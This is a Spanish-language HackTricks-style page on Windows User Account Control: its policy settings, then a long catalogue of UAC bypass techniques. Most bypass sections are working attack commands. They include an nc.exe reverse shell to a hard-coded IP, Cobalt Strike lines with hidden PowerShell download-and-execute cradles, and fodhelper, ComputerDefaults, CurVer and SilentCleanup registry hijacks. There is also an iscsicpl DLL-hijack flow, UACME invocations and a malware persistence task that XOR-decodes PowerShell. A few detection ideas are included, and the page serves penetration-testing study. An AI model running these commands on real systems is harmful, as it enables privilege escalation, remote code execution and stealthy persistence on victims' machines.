# UAC - Control de cuentas de usuario

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) es una característica que habilita un **mensaje de consentimiento para actividades con privilegios elevados**. Las aplicaciones tienen distintos niveles de `integrity`, y un programa con un **nivel alto** puede realizar tareas que **podrían comprometer el sistema**. Cuando UAC está habilitado, las aplicaciones y tareas siempre **se ejecutan en el contexto de seguridad de una cuenta que no es de administrador**, a menos que un administrador autorice explícitamente que esas aplicaciones o tareas tengan acceso de administrador al sistema para ejecutarse. Es una característica práctica que protege a los administradores de cambios involuntarios, pero no se considera un límite de seguridad.<sup>[[2]](#references)</sup>

Para obtener más información sobre los niveles de integridad:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Cuando UAC está habilitado, un usuario administrador recibe 2 tokens: un token de usuario estándar para realizar acciones habituales con integridad media y otro con los privilegios de administrador.

Esta [página](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) explica en profundidad cómo funciona UAC e incluye el proceso de inicio de sesión, la experiencia del usuario y la arquitectura de UAC.<sup>[[2]](#references)</sup> Los administradores pueden usar políticas de seguridad para configurar cómo funciona UAC según las necesidades de su organización, ya sea localmente (mediante secpol.msc) o configurando e implementando la configuración mediante Group Policy Objects (GPO) en un entorno de dominio de Active Directory. [Aquí](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) se analizan en detalle las distintas opciones. Hay 10 opciones de Group Policy que se pueden configurar para UAC. La siguiente tabla ofrece más detalles:

| Opción de Group Policy                                                                                                                                                                                                                                                                                                                                                           | Clave del Registro                | Valor predeterminado                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Deshabilitado)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Solicitar consentimiento para binarios que no son de Windows en el escritorio seguro) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Solicitar credenciales en el escritorio seguro)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Habilitado; deshabilitado de forma predeterminada en Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Deshabilitado)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Habilitado)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Habilitado)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Deshabilitado)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Habilitado)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Habilitado)                                              |

### Políticas para instalar software en Windows

Las **políticas de seguridad locales** (secpol.msc en la mayoría de los sistemas) están configuradas de forma predeterminada para **impedir que los usuarios que no son administradores instalen software**. Esto significa que, aunque un usuario que no sea administrador pueda descargar el instalador de tu software, no podrá ejecutarlo sin una cuenta de administrador.

### Claves del Registro para hacer que UAC solicite elevación

Como usuario estándar sin derechos de administrador, puedes hacer que la cuenta «estándar» **reciba una solicitud de credenciales de UAC** cuando intente realizar ciertas acciones. Para ello, es necesario modificar ciertas **claves del Registro**, lo que requiere permisos de administrador, a menos que exista un **UAC bypass** o que el atacante ya haya iniciado sesión como administrador.

Aunque el usuario pertenezca al grupo **Administrators**, estos cambios hacen que tenga que **volver a introducir las credenciales de su cuenta** para realizar acciones administrativas.

**En la práctica, esto solo resulta útil si ya tienes un token elevado, un UAC bypass o una configuración incorrecta que te permite cambiar estas claves; de lo contrario, se bloqueará la propia escritura en el Registro.**

Las claves y entradas del Registro que debes cambiar son las siguientes (con sus valores predeterminados entre paréntesis):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

También se puede hacer manualmente mediante la herramienta Local Security Policy. Una vez realizados los cambios, las operaciones administrativas solicitarán al usuario que vuelva a introducir sus credenciales.

### Nota

**User Account Control no es un límite de seguridad.** Por lo tanto, los usuarios estándar no pueden escapar de sus cuentas ni obtener derechos de administrador sin un exploit de escalada de privilegios local.

### Solicitar a un usuario «acceso completo al equipo»

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### Privilegios de UAC

- Internet Explorer Protected Mode usa comprobaciones de integridad para impedir que los procesos con un nivel de integridad alto (como los navegadores web) accedan a datos con un nivel de integridad bajo (como la carpeta de archivos temporales de Internet). Esto se consigue ejecutando el navegador con un token de baja integridad. Cuando el navegador intenta acceder a datos almacenados en la zona de baja integridad, el sistema operativo comprueba el nivel de integridad del proceso y permite el acceso en consecuencia. Esta función ayuda a impedir que los ataques de remote code execution accedan a datos confidenciales del sistema.
- Cuando un usuario inicia sesión en Windows, el sistema crea un token de acceso que contiene una lista de los privilegios del usuario. Los privilegios se definen como la combinación de los derechos y las capacidades de un usuario. El token también contiene una lista de las credenciales del usuario, que se usan para autenticarlo en el equipo y en los recursos de la red.

### Autoadminlogon

Para configurar Windows para que inicie sesión automáticamente con un usuario específico al arrancar, establece la **clave del registro `AutoAdminLogon`**. Esto resulta útil en entornos de quiosco o para realizar pruebas. Úsalo solo en sistemas seguros, ya que la contraseña queda expuesta en el registro.

Establece las siguientes claves mediante el Editor del Registro o `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

Para volver al comportamiento normal de inicio de sesión, establece `AutoAdminLogon` en 0.

## UAC bypass

> [!TIP]
> Ten en cuenta que, si tienes acceso gráfico a la víctima, el UAC bypass es sencillo, ya que puedes hacer clic en «Sí» cuando aparezca el aviso de UAC.

El UAC bypass es necesario en la siguiente situación: **UAC está activado, tu proceso se ejecuta en un contexto de integridad media y tu usuario pertenece al grupo de administradores**.

Es importante mencionar que **es mucho más difícil realizar un UAC bypass si está en el nivel de seguridad más alto (Always) que si está en cualquiera de los otros niveles (Default).**

### Evaluación rápida desde un shell de integridad media

Antes de intentar un bypass, confirma que estás en la situación adecuada y relaciona la compilación del host con métodos conocidos que funcionen:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

Notas prácticas:
- Si `EnableLUA=0`, no necesitas un bypass: cualquier token de administrador puede solicitar directamente un nivel de integridad alto.
- `ConsentPromptBehaviorAdmin=2` o `5` es el escenario habitual para los bypasses de auto-elevación basados en COM.
- `Always Notify` eleva el nivel de dificultad, pero aun así deberías probar la build exacta en lugar de dar por hecho que fallará: UACME sigue registrando algunos métodos compatibles con `AlwaysNotify` en versiones modernas de Windows.<sup>[[3]](#references)</sup>

### UAC deshabilitado

Si UAC ya está deshabilitado (`ConsentPromptBehaviorAdmin` es **`0`**), puedes **ejecutar un reverse shell con privilegios de administrador** (nivel de integridad alto) usando algo como:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass con duplicación de token

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### RPC local + objeto de depuración reutilizable

La interfaz RPC local de AppInfo `201ef99a-7fa0-444c-9399-19ba84f12a1a` puede crear un proceso con la depuración habilitada. Los procesos creados con depuración en el mismo thread comparten el objeto de depuración del thread; un evento de depuración de creación incluye un handle de proceso con acceso completo, aunque el resultado RPC en sí solo conceda acceso limitado. Esto convierte la reutilización del objeto de depuración en una primitiva UAC para un miembro del grupo Administrators con integridad media.<sup>[[11]](#references)[[12]](#references)</sup>

Una cadena práctica es:<sup>[[11]](#references)[[12]](#references)</sup>

1. Llama al método RPC local (directamente o mediante `NdrAsyncClientCall`) para crear un proceso sacrificable no elevado con la depuración habilitada.
2. Consulta `ProcessDebugObjectHandle` con `NtQueryInformationProcess`, desvincúlalo con `NtRemoveProcessDebug`, conserva el objeto y termina el proceso sacrificable.
3. Usa la misma interfaz RPC para crear un proceso autoelevado de confianza y, a continuación, asocia el objeto guardado con el thread que realiza la llamada mediante `DbgUiSetThreadDebugObject`.
4. Llama a `WaitForDebugEvent` y toma el handle del proceso del `CREATE_PROCESS_DEBUG_EVENT`; duplícalo con `NtDuplicateObject` antes de continuar.
5. Proporciona el handle duplicado a `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` e inicia el payload con una estructura de información de inicio extendida. Esto reutiliza el contexto del proceso elevado y le da al proceso hijo una relación con un proceso padre que parece de confianza.

Busca la secuencia breve, no solo el binario autoelevado: creación de procesos mediante RPC local de AppInfo, consultas a `ProcessDebugObjectHandle`, desvinculación/revinculación del depurador, un evento de depuración de creación inmediato, duplicación de handles y un proceso hijo cuyo proceso padre registrado no coincide con el proceso que ejecutó las API de creación.<sup>[[12]](#references)</sup>

### "Bypass" UAC **muy** básico (acceso completo al sistema de archivos)

Si tienes una shell con un usuario que pertenece al grupo Administrators, puedes **montar el recurso compartido C$** mediante SMB (sistema de archivos) localmente en un disco nuevo y tendrás **acceso a todo el sistema de archivos** (incluso a la carpeta personal del Administrator).

> [!WARNING]
> **Parece que este truco ya no funciona**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Bypass de UAC con Cobalt Strike

Las técnicas de Cobalt Strike solo funcionarán si UAC no está configurado en su nivel máximo de seguridad

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** y **Metasploit** también tienen varios módulos para **bypass** de **UAC**.

### Interfaces COM elevadas (`ICMLuaUtil` / `CMSTPLUA`)

Los objetos COM autoelevados siguen siendo una superficie práctica de UAC en las versiones modernas. UACME todavía registra `ICMLuaUtil` como funcional en las ramas actuales de Windows, y las herramientas ofensivas siguen adaptando `CMSTPLUA` al combinar un proceso de escritorio interactivo, ejecución de 64 bits y, a veces, suplantación del PEB/proceso antes de invocar el COM Elevation Moniker.<sup>[[3]](#references)</sup>

Consejos prácticos:
- Prefiere un proceso de **64 bits** en la **sesión interactiva** del usuario (comúnmente `explorer.exe` o un proceso hijo).
- Si falla una shell directa, vuelve a intentarlo desde una implementación de BOF / UACME en vez de usar un wrapper ingenuo de `CreateProcess`.
- Ten en cuenta que la ejecución del proceso hijo ocurre en un **proceso elevado separado**; muchos BOF no elevan el beacon actual en el mismo proceso.

### KRBUACBypass

Documentación y herramienta en [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Exploits de bypass de UAC

[**UACME**](https://github.com/hfiref0x/UACME) es una colección de técnicas de bypass de UAC. Compílalo con Visual Studio o MSBuild; la compilación crea varios ejecutables (por ejemplo, `Source\Akagi\output\x64\Debug\Akagi.exe`), así que selecciona el método adecuado para la compilación de destino.<sup>[[3]](#references)</sup>\
Ten cuidado: algunos bypasses ejecutan programas visibles o muestran avisos que pueden alertar al usuario.<sup>[[3]](#references)</sup>

UACME indica la **versión de compilación a partir de la cual empezó a funcionar cada técnica**.<sup>[[3]](#references)</sup> Puedes buscar una técnica que afecte a tus versiones:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Además, usando [esta](https://en.wikipedia.org/wiki/Windows_10_version_history) página, puedes obtener la versión de Windows `1607` a partir de los números de compilación.

Un flujo de trabajo práctico consiste en **evaluar la compilación del host** primero y, solo entonces, ejecutar el método correspondiente:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` compara rápidamente la compilación local con sus métodos UAC conocidos, lo que resulta útil para descartar rápidamente PoC obsoletos.<sup>[[4]](#references)</sup>
- `UACME` sigue siendo el mejor catálogo público para asociar un bypass con una compilación específica. La versión 3.7.1 añadió los métodos 83–85, mientras que la versión anterior volvió a probar los métodos existentes en **Windows 11 25H2**; vuelve a consultar la tabla de métodos y las notas de la versión en lugar de asumir que un PoC antiguo sigue funcionando sin cambios.<sup>[[3]](#references)[[9]](#references)</sup>

### Cadenas WNF/UIAccess compatibles con Always Notify (UACME 3.7.1)

`Always Notify` no elimina todos los bypass de UAC. UACME 3.7.1 implementa tres métodos x64 nuevos que combinan el estado del entorno/protocolo controlado por el usuario con el comportamiento de tareas programadas con privilegios elevados o UIAccess, y marca todos como `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** redirige `SystemRoot` para que la tarea `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, activada por WNF, haga que `taskhostw.exe` con privilegios elevados cargue lateralmente `unifiedconsent.dll`. UACME lo registra desde la compilación 19041 de Windows 10.
- **84 — TabTip:** usa la misma primitiva de variable de entorno contra UIAccess `TabTip.exe`, que carga `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` o `rsaenh.dll`, según la compilación; después, pivota desde el contexto UIAccess resultante con integridad alta. UACME lo registra desde Windows 8.1 / Server 2016.
- **85 — Narrator:** secuestra el protocolo `feedback-hub` por usuario, controla Narrator con `Alt+CapsLock+F` y, luego, inicia una copia modificable de `osk.exe` que carga lateralmente `OskSupport.dll`. Esto requiere un escritorio interactivo y UACME lo registra desde Windows 10 1809 / Server 2019.

Después de compilar las unidades de payload y Akagi según la documentación de UACME, invoca el número del método correspondiente (el comando opcional usa `cmd.exe` de forma predeterminada):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Los métodos 84 y 85 dependen de UIAccess y de la interacción con el escritorio, así que no esperes que funcionen sin cambios desde Session 0 o desde una shell de servicio no interactiva. Los tres manipulan el estado del entorno y de los protocolos, y preparan DLLs; inspecciona la implementación y elimina esos artefactos después de las pruebas.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

El binario de confianza `fodhelper.exe` se ejecuta automáticamente con privilegios elevados en las versiones modernas de Windows. Al iniciarse, consulta la ruta del registro por usuario que aparece a continuación sin validar el verbo `DelegateExecute`. Colocar allí un comando permite que un proceso con Medium Integrity (si el usuario pertenece al grupo Administradores) inicie un proceso con High Integrity sin mostrar un aviso de UAC.

Ruta del registro consultada por fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>Pasos de PowerShell (configura tu payload y luego actívalo)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notas:
- Funciona cuando el usuario actual es miembro de Administrators y el nivel de UAC es predeterminado/permisivo (no Always Notify con restricciones adicionales).
- Usa la ruta `sysnative` para iniciar un PowerShell de 64 bits desde un proceso de 32 bits en Windows de 64 bits.
- El payload puede ser cualquier comando (PowerShell, cmd o una ruta a un EXE). Evita las interfaces de usuario que solicitan confirmación para mantener el sigilo.

#### Disparador `ComputerDefaults.exe` para el mismo controlador de `ms-settings`

`ComputerDefaults.exe` resuelve la misma asociación por usuario `ms-settings\Shell\Open\command` que `fodhelper.exe`.<sup>[[13]](#references)[[14]](#references)</sup> Después de establecer el comando predeterminado y el valor `DelegateExecute` vacío como se indicó arriba, usa `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` como disparador alternativo; no repitas la configuración del registro.<sup>[[13]](#references)[[14]](#references)</sup> Siguen aplicándose los requisitos previos sobre el administrador con integridad media y la directiva de UAC indicados en las notas anteriores sobre `fodhelper.exe`.<sup>[[2]](#references)[[3]](#references)</sup> UACME cataloga este disparador desde Windows 10 RS4 (build 17134), así que verifícalo en la build de destino.<sup>[[3]](#references)</sup>

#### Variante de hijack de CurVer/extensión (solo HKCU)

Las muestras recientes que abusan de `fodhelper.exe` evitan `DelegateExecute` y, en su lugar, **redirigen el ProgID de `ms-settings`** mediante el valor por usuario `CurVer`. El binario autoelevado sigue resolviendo el controlador en `HKCU`, por lo que no se necesita un token de administrador para crear las claves:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Una vez con privilegios elevados, el malware suele **desactivar las solicitudes futuras** estableciendo `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` en `0`. Luego realiza otras acciones para evadir las defensas (p. ej., `Add-MpPreference -ExclusionPath C:\ProgramData`) y vuelve a crear mecanismos de persistencia para ejecutarse con alta integridad. Una tarea de persistencia típica guarda en disco un **script de PowerShell cifrado con XOR** y lo decodifica y ejecuta en memoria cada hora:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

Esta variante sigue limpiando el dropper y deja solo los payloads preparados, por lo que la detección depende de supervisar el **hijack de `CurVer`**, la manipulación de `ConsentPromptBehaviorAdmin`, la creación de exclusiones de Defender o las tareas programadas que descifran PowerShell en memoria.<sup>[[5]](#references)</sup>

### Bypass de UAC mediante la tarea `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` inicia `cleanmgr.exe` con los privilegios más altos y expande `%windir%` desde el entorno del usuario. Si controlas `HKCU\Environment\windir`, puedes redirigir esa expansión a un comando arbitrario y obtener alta integridad sin un cuadro de diálogo de consentimiento.<sup>[[8]](#references)</sup> Sigue mereciendo la pena probar este método en compilaciones recientes, porque UACME mantiene activa la técnica y el seguimiento de problemas recientes indica que Windows 11 24H2 quizá solo requiera pequeños ajustes en las comillas.<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

Si la tarea cita la ruta en esa build, vuelve a intentarlo con un payload que termine en una comilla (por ejemplo, `cmd.exe"`). Limpia siempre `HKCU\Environment\windir` después de las pruebas.

#### Más UAC bypass

Muchos UAC bypass clásicos que abusan de flujos de UI, objetos COM o interacción con el escritorio requieren una **sesión interactiva completa** con la víctima; un shell común de `nc.exe` o un servicio que se ejecuta en la **Session 0** a menudo no basta.

A menudo puedes solucionar esto usando una sesión de **meterpreter**. Migra a un **proceso** cuyo valor de **Session** sea igual a **1**:

![Apunta ms-settings a una extensión personalizada (.thm) y asigna esa extensión a nuestro payload - Más UAC bypass: Puedes hacerlo con una sesión de meterpreter. Migra a un proceso cuyo valor de Session...](<../../images/image (863).png>)

(_explorer.exe_ debería funcionar)

### UAC bypass con GUI

Si tienes acceso a una **GUI, puedes aceptar el aviso de UAC** cuando aparezca; en realidad, no necesitas un bypass técnico. Por lo tanto, obtener una sesión de GUI suele bastar para superar la fricción práctica que añade UAC.

Además, si obtienes una sesión de GUI que alguien estaba usando (potencialmente mediante RDP), habrá **algunas herramientas que se ejecutan como administrador** desde las que podrías **ejecutar** directamente un **cmd**, por ejemplo, **como administrador**, sin que UAC vuelva a mostrar un aviso, como [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Esto podría ser un poco más **stealthy**.

### UAC bypass mediante fuerza bruta ruidosa

Si el ruido es aceptable, una herramienta como [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) puede solicitar la elevación repetidamente hasta que el usuario la acepte.

### Tu propio bypass: metodología básica de UAC bypass

Si echas un vistazo a **UACME**, verás que **muchos UAC bypass abusan del DLL hijacking** (a menudo, haciendo que un binario con privilegios elevados cargue una DLL controlada por el atacante desde una ruta con permisos de escritura). [Lee esto para aprender a encontrar una vulnerabilidad de DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Encuentra un binario que se **autoelevate** (comprueba que, al ejecutarlo, se ejecute con un nivel de integridad alto).
2. Con procmon, busca eventos "**NAME NOT FOUND**" que puedan ser vulnerables a **DLL Hijacking**.
3. Probablemente tendrás que **escribir** la DLL dentro de algunas **rutas protegidas** (como C:\Windows\System32), donde no tienes permisos de escritura. Puedes evitar esto usando:
   1. **wusa.exe**: Windows 7, 8 y 8.1. Permite extraer el contenido de un archivo CAB en rutas protegidas (porque esta herramienta se ejecuta con un nivel de integridad alto).
   2. **IFileOperation**: Windows 10.
4. Prepara un **script** para copiar tu DLL en la ruta protegida y ejecutar el binario vulnerable y autoelevado.

### Otra técnica de UAC bypass

Consiste en observar si un **binario autoElevated** intenta **leer** del **registry** el **nombre/ruta** de un **binario** o **comando** que se va a **ejecutar** (esto es más interesante si el binario busca esta información dentro de **HKCU**).

### UAC bypass mediante `SysWOW64\iscsicpl.exe` + DLL hijack usando `PATH` del usuario

El binario de 32 bits `C:\Windows\SysWOW64\iscsicpl.exe` se **autoeleva** y puede abusarse para que cargue `iscsiexe.dll` según el orden de búsqueda. Si puedes colocar una `iscsiexe.dll` maliciosa en una carpeta con **permisos de escritura para el usuario** y luego modificar el `PATH` del usuario actual (por ejemplo, mediante `HKCU\Environment\Path`) para que se busque en esa carpeta, Windows podría cargar la DLL del atacante dentro del proceso elevado `iscsicpl.exe` **sin mostrar un aviso de UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Notas prácticas:
- Esto resulta útil cuando el usuario actual pertenece a **Administrators**, pero se ejecuta con **Medium Integrity** debido a UAC.
- La copia de **SysWOW64** es la relevante para este bypass. Trata la copia de **System32** como un binario distinto y valida su comportamiento por separado.
- La primitiva combina **autoelevación** y **DLL search-order hijacking**, así que el mismo flujo de trabajo con ProcMon que se usa para otros UAC bypass sirve para validar la carga de la DLL que falta.

Flujo mínimo:

```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ideas de detección:
- Genera una alerta si se ejecuta `reg add` o se escriben valores en el registro en `HKCU\Environment\Path` e inmediatamente después se ejecuta `C:\Windows\SysWOW64\iscsicpl.exe`.
- Busca `iscsiexe.dll` en ubicaciones **controladas por el usuario**, como `%TEMP%` o `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlaciona los inicios de `iscsicpl.exe` con procesos secundarios inesperados o cargas de DLL desde ubicaciones fuera de los directorios normales de Windows.

### Investigaciones recientes que conviene revisar por separado

Algunas cadenas posteriores a 2024 ya no se parecen a los clásicos secuestros del registro `HKCU\Software\Classes`. Por ejemplo, el envenenamiento de la caché del contexto de activación puede combinar un **cambio de unidad** y una **redirección de DLL** para pasar de integridad media a alta mediante interfaces de usuario de confianza o binarios autoelevados, como `ctfmon.exe`, y luego otros objetivos, como `fodhelper.exe`. En lugar de duplicar aquí el extenso PoC, consulta los ejemplos compactos de payloads en:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Secuestro de la letra de unidad de Administrator Protection (versión preliminar) mediante el mapa de dispositivos DOS por sesión de inicio de sesión

> [!NOTE]
> A agosto de 2026, Microsoft todavía documenta Administrator Protection como una **versión preliminar de Insider**: el despliegue de octubre de 2025 se revirtió y está previsto para una fecha posterior. Antes de probar estas cadenas, confirma que **Admin Approval Mode with Administrator protection** esté realmente habilitado y que el dispositivo se haya reiniciado; una cadena de versión estándar 25H2 por sí sola no demuestra que la función esté activa.<sup>[[10]](#references)</sup>

Para conocer toda la superficie de ataque de `RAiLaunchAdminProcess` / UIAccess en las compilaciones preliminares de Windows 11 25H2, consulta la página específica:

{{#ref}}
